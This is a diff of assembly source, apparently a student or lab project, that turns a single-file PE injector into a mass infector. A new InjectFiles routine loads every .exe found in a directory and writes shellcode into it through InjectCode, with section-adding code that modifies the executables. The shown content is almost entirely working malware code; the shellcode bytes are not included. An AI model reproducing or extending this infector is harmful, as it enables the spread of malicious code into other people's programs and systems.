@@ -152,7 +152,7 @@ LoadPeFile proto CurrentStdcallNotation :cword, :cword, :cword
 ParsePeFileHeader proto CurrentStdcallNotation :cword, :cword
 printFileName proto CurrentStdcallNotation szFileName:ptr dword
 SearchForFiles proto szDir:ptr dword, fileExtension:ptr dword, func:ptr FileFunc
-
+InjectFiles proto CurrentStdcallNotation hFile:ptr cword, pe:ptr PeHeaders 
 
 DefineStdcallProto CreateFileA, 7
 DefineStdcallProto GetFileSize, 2
@@ -205,8 +205,8 @@ local   pe:PeHeaders
 local 	i:cword
 local 	memory:cword
 local 	pe_:cword
-    local szDir[260]:byte
-	local szExt[10]:byte
+local szDir[260]:byte
+local szExt[10]:byte
 
 
 	and csp, -16
@@ -258,55 +258,35 @@ local 	pe_:cword
 
 
 	; Get addres of function
-	lea cdi, printFileName
+	lea cdi, InjectFiles
 
 	; Call SearchForFiles
     invoke SearchForFiles, addr szDir, addr szExt, cdi
-	
-	;;-------------------  
-	lea ccx, [cbx + str_Hello - start]
-    invoke LoadPeFile, ccx, addr [pe], 0
-  
-    ;;-------------------
-    ;mov cbx, pe
-	;mov ccx, [cbx].PeHeaders.countSec
-	;mov cdi, 0
-;
-	;loop1:
-	;mov cbx, pe
-    ;mov cax, cdi
-    ;imul cax, sizeof(IMAGE_SECTION_HEADER)
-    ;mov ccx, [cbx].PeHeaders.sections
-    ;add ccx, cax
-    ;lea ccx, [ccx].IMAGE_SECTION_HEADER.Name1
-    ;
-	;push cdi
-	;;invoke printf, $CTA0("%s"), cax
-	;pop cdi
-	;
-	;inc cdi
-	;loop loop1
-
-    invoke InjectCode, addr[pe], glShellCode, sizeof(glShellCode)
-
-	;;invoke UnloadPeFile, addr [pe]
-	mov cbx, pe
-	assume cbx: ptr PeHeaders
-	push cbx
-	invoke sc_UnmapViewOfFile, [cbx].mem
-	pop cbx
-	push cbx
-    invoke sc_CloseHandle, [cbx].mapd
-    pop cbx
-	push cbx
-    invoke sc_CloseHandle, [cbx].fd
-    pop cbx
-    ;;-------------------
   
     invoke Stdcall1 ptr [pExitProcess], 0
     ; ExitProcess (0)
     
 main endp
+
+InjectFiles proc CurrentStdcallNotation hFile:ptr cword, pe:ptr PeHeaders 
+	mov ccx, hFile
+	invoke LoadPeFile, ccx, addr [pe], 0
+
+    invoke InjectCode, addr[pe], glShellCode, sizeof(glShellCode)
+
+	;;invoke UnloadPeFile, addr [pe]
+	mov cdi, pe
+	;assume cdi: ptr PeHeaders
+	push cdi
+	invoke sc_UnmapViewOfFile, [cdi].PeHeaders.mem
+	pop cdi
+	push cdi
+    invoke sc_CloseHandle, [cdi].PeHeaders.mapd
+    pop cdi
+	push cdi
+    invoke sc_CloseHandle, [cdi].PeHeaders.fd
+    pop cdi
+InjectFiles endp
 
 printFileName proc CurrentStdcallNotation szFileName:ptr dword
     invoke sc_printf, addr [cbx + outputFormat - start], szFileName
@@ -506,7 +486,7 @@ AddSection proc CurrentStdcallNotation uses cdi cbx csi cdx pe:ptr PeHeaders, ne
 	
     mov ccx, pe	
     ;;assume ccx: ptr PeHeaders
-    assume ccx: nothing
+    ;assume ccx: nothing
 	
 	mov csi, [ccx].PeHeaders.nthead
 	mov cax, [csi].IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment
@@ -994,7 +974,7 @@ str_Kernel32 db "kernel32.dll", 0
 str_Hello db "hello.exe", 0
 new_sec db ".new", 0
 outputFormat db "%s", 13, 10, 0
-dirPath db 'C:\Users\Labour\Downloads', 0
+dirPath db 'C:\Users\Labour\Downloads\hello', 0
 exeExt db '\*.exe', 0
 
 strCucdir:
